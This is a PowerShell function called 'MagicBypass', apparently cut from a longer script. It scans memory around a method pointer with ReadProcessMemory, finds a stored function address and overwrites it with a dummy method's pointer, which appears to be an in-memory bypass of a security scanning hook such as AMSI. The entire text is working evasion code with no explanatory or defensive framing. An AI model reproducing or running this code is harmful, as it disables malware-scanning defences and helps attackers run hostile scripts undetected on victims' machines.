function MagicBypass {
    :initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
        [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
        $ReadedMemoryArray = [byte[]]::new($ReadBytes)
        $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
        for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
        $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
        [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
        if ($PointerToCompare -eq $funcAddr) {
            Write-Host "Found @ $($j) : $($i)!"
            [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
            break initialloop
        }
        }
    }
    [IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
    $buf = [IntPtr[]] ($DummyPointer)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)

    $FinishDate=Get-Date;
    $TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
    Write-Host "$TimeElapsed seconds"
}